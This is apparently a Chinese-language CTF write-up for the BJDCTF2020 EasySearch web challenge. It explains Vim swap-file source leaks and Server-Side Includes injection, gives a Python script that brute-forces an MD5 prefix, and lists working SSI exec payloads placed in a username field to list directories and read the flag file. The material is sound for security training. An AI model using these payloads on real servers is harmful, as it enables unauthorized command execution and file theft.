---
title: '[BJDCTF2020]EasySearch 1'
categories:
  - 
tags: []
abbrlink: b60dcf9c
date: 2026-01-30 18:35:13
---
# [BJDCTF2020]EasySearch

# 详细解题1

## 前期知识储备：

### 1.index.php.swp

在 CTF 和 Web 开发中，`.swp` 文件是一个非常经典且重要的**源码泄露点**。

###### 1. 它到底是什么？

`.index.php.swp` 是 **Vim 编辑器** 生成的“交换文件”（Swap File）。

当你使用 Vim 编辑 `index.php` 时，Vim 会在后台自动创建一个隐藏文件。

- **文件名规则**：在原文件名前加一个点 `.`，并在后缀名后加 `.swp`。

- **状态**：

  如果你正常关闭 Vim，这个文件会自动删除；

  但如果 Vim **非正常关闭**（比如 SSH 断开、进程被杀、服务器宕机），这个文件就会残留在服务器上。

###### 2. 为什么在 CTF 中很重要？

因为它包含了 **`index.php` 的完整源代码**。

很多出题人会故意在服务器上留下这个文件，让你通过它获取后端逻辑。由于它是一个隐藏文件（以 `.` 开头），普通的 `ls` 命令看不见它，很多管理员会忘记删除。



---

### 2.SSI——Server-Side Includes Injection（服务端包含注入）

###### 1. 什么是 SSI 指令？

**SSI (Server Side Includes)** 是一种服务器端脚本语言。

目的:在静态的 HTML 页面中动态插入内容（比如在每个网页底部自动加上版权时间，而不用手动去改每个文件）。

- **它的存在形式**：它隐藏在 HTML 的注释符号 `` 中，所以普通用户在浏览器里看不见它。
- **它的危险性**：如果服务器配置允许执行指令，攻击者可以通过特定的语法 `#exec cmd="..."` 让服务器执行系统命令。

###### 2. 你怎么知道这里有这个注入？

在黑盒测试（不知道源码）和白盒审计（有源码）中，通过以下特征判断：

1. **文件后缀名**：代码中出现了 `$file_shtml = "... .shtml";`。

   但当你访问一个 **`.shtml`** 文件时：

   1. **识别后缀**：服务器看到是 `.shtml`，就会启动 **SSI 模块**。
   2. **扫描指令**：服务器会从头到尾读一遍代码，寻找 ``，服务器在读取这个文件展示给你看的时候，会顺便把 `ls` 命令给跑了。这就是 **SSI 注入**。

2. **可控的输入点**：你的 `$_POST['username']` 被直接拼接到 `$text` 里，然后写入了文件。这意味着你可以控制这个文件的部分内容。

3. **解析机制**：只要后端使用了支持 SSI 的 Web 服务器（如 Apache 或 Nginx 开启了 `Includes` 模块），它在读取这个 `.shtml` 时就会解析其中的指令。



 **知识点：includes和include**

| **特性**     | **SSI 的 Includes 模块**                                     | **PHP 的 include 语句**                   |
| ------------ | ------------------------------------------------------------ | ----------------------------------------- |
| **执行者**   | **Web 服务器** (Apache/Nginx)                                | **PHP 解析器**                            |
| **语法格式** | ``                                                           | `<?php include('...'); ?>`                |
| **主要用途** | 专门负责盯着那些 `.shtml` 文件。一旦有人访问这种文件，这个模块就像一个“扫描仪”，扫描里面有没有 `` 这种格式的 **SSI 指令**。 | 复杂的代码逻辑复用、库引入                |
| **后缀要求** | 通常要求是 `.shtml`                                          | 通常在 `.php` 文件中运行                  |
| **安全性**   | 容易导致 **SSI 注入**（系统命令执行）                        | 容易导致 **LFI/RFI**（本地/远程文件包含） |



**3.注入格式为：<!--#exec cmd="命令" -->**

---



sql注入试过，没用

没思路就扫描，githack和dirsearch

发现index.php.swp，打开后源代码如下

```
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

1.substr(md5($_POST['password']),0,6)

从md5后的passwd中拿出前面六个字符

2.$admin = '6d0bc1';

六个字符要和'6d0bc1'相等

**写脚本**

这里注意：

MD5 的结果是由 `0-9` 和 `a-f` 这 16 个字符组成的。

- 你的目标是匹配前 **6** 位（`6d0bc1`）。

- 每一位字符都有 16 种可能，所以 6 位字符的总组合数是：

  166=16,777,216

  （大约 **1677 万**种可能）。

**这意味着：** 如果你随机尝试 1677 万个不同的字符串，理论上**一定**能遇到一个 MD5 前六位是 `6d0bc1` 的。设置 `10000000`（一千万）是因为通常运气不需要那么差，跑一半左右就能撞到一个。

```
import hashlib # 导入哈希工具库

# 我们要找一个数字 i，让它的 MD5 结果前 6 位是 6d0bc1
for i in range(10000000): # 让数字从 0 循环到一千万
    # 1. str(i).encode()：把数字转成计算机认识的字节
    # 2. hashlib.md5(...).hexdigest()：算出这个数字的 MD5 字符串
    md5_value = hashlib.md5(str(i).encode()).hexdigest()
    
    # 3. startswith('6d0bc1')：检查这个字符串开头是不是 6d0bc1
    if md5_value.startswith('6d0bc1'):
        print(f"成功！原始数字是: {i}") 
        break 
```

```
成功！原始数字是: 2020666
```

登录

![image-20260130161200170](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130161200170.png)

看到shtml说明有ssi注入，这里打开看看

![image-20260130161348971](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130161348971.png)

这里回显在username，那么我们就在这里进行ssi注入

注入格式为：<!--#exec cmd="命令" -->

payload:

```
username=<!--#exec cmd="ls /"-->&password=2020666
username=<!--#exec cmd="ls ./"-->&password=2020666
username=<!--#exec cmd="ls ../"-->&password=2020666

username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->&password=2020666
```



![image-20260130161940507](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130161940507.png)



![image-20260130161907961](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130161907961.png)



![image-20260130161747366](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130161747366.png)



![image-20260130162200571](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130162200571.png)